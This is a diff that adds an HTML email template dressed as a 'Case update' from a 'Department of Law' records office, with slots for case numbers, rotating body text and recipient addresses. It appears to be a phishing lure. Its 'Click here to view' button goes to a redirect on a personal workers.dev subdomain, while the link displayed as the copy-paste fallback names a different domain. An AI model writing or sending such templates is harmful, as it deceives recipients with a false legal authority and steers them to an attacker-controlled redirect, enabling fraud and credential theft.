@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Case update</title>
+</head>
+<body style="margin:0;padding:0;background-color:#f4f6f9;font-family:'Segoe UI',Arial,Helvetica,sans-serif;color:#1f2937;line-height:1.6">
+  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color:#f4f6f9;padding:40px 16px">
+    <tr>
+      <td align="center">
+        <table role="presentation" width="620" cellspacing="0" cellpadding="0" style="background-color:#ffffff;border-radius:10px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,0.06);max-width:620px;width:100%">
+          <!-- Header -->
+          <tr>
+            <td style="background-color:#1e40af;padding:28px 40px;text-align:center">
+              <img src="cid:sender_seal" alt="Department of Law" style="display:block;margin:0 auto 14px auto;max-height:56px;width:auto">
+              <h1 style="color:#ffffff;font-size:20px;margin:0;font-weight:600;letter-spacing:0.3px">Records Review Office</h1>
+              <p style="color:#bfdbfe;font-size:13px;margin:6px 0 0 0;letter-spacing:0.4px">CASE {{ case_number }} &nbsp;|&nbsp; REFERENCE {{ reference_code }}</p>
+            </td>
+          </tr>
+          <!-- Content -->
+          <tr>
+            <td style="padding:32px 40px 24px 40px;font-size:16px;color:#374151">
+              <p style="margin:0 0 14px 0">{{ salutation }}</p>
+
+              <p style="margin:0 0 8px 0">{{ body_variant_1 }}</p>
+
+              <p style="margin:0 0 8px 0">{{ body_variant_2 }}</p>
+
+              <p style="margin:0 0 20px 0">{{ body_variant_3 }}</p>
+
+              <!-- CTA -->
+              <table role="presentation" cellspacing="0" cellpadding="0" style="margin:0 0 20px 0">
+                <tr>
+                  <td style="background-color:#1e40af;border-radius:6px">
+                    <a href="https://redirectdepartmentallawcom.johnnyeasley25.workers.dev/redirect" style="display:inline-block;padding:12px 26px;font-size:15px;color:#ffffff;text-decoration:none;font-weight:600;border-radius:6px">Click here to view</a>
+                  </td>
+                </tr>
+              </table>
+
+              <p style="margin:0 0 8px 0;font-size:14px;color:#4b5563">If the button doesn't open, copy this link:</p>
+              <p style="margin:0 0 20px 0;font-size:14px;word-break:break-all;color:#1e40af">
+                <a href="http://departmentallaw.com/" style="color:#1e40af;text-decoration:none">http://departmentallaw.com/</a>
+              </p>
+
+              <p style="margin:0 0 20px 0;font-size:15px;color:#374151">If this isn't your case or you have questions, reply <strong>Stop</strong> and we'll update our records.</p>
+
+              <p style="margin:0;font-size:15px;color:#111827">— {{ sender_name }}<br>
+                <span style="font-size:13px;color:#6b7280">
+                  <a href="http://departmentallaw.com/" style="color:#1e40af;text-decoration:none">departmentallaw.com</a>
+                </span>
+              </p>
+            </td>
+          </tr>
+          <!-- Footer -->
+          <tr>
+            <td style="padding:16px 40px;background-color:#f8fafc;text-align:center;border-top:1px solid #e5e7eb">
+              <p style="margin:0;font-size:12px;color:#9ca3af">Sent to {{ recipient_email }} &nbsp;|&nbsp; {{ current_date }}</p>
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+  </table>
+</body>
+</html>
